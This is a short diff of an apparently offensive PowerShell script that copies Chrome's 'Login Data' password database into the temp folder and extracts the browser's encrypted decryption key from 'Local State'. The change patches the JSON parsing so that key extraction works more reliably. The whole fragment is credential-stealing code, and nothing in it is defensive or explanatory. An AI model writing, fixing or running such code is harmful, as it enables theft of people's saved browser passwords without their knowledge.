@@ -13,7 +13,7 @@ $s="$z\\Default\\Login Data"
 cp $s $env:TMP\$FileName1
 
 # Grab the decryption key and save it in temp folder
-$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
+$b=((gc "$z\\Local State").Replace('""', '"_empty"')|ConvertFrom-Json).os_crypt.encrypted_key
 echo $b >> $env:TMP\$FileName2
 
 # Start Chrome again
